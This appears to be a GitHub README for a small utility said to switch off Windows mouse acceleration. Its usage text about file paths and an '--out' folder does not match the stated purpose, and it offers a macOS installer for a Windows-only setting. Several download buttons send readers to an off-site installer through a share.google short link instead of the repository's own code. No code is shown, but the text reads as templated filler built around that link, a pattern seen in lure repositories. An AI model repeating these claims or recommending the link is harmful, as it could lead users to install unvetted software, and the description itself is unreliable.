![Mouse Accel Off](assets/hero.png)

# Mouse Accel Off

*Raw pointer feel without the Mouse dialog.*

## What Mouse Accel Off is

**Mouse Accel Off** is a desktop utility. Show Enhanced Pointer Precision and turn it off or on.

Games and design work often want accel off. The checkbox is buried.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Show the flag
- Off or on
- User-level
- Does not install a filter driver

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/georgeevans73/mouse-accel-off

MIT license. See `LICENSE`.
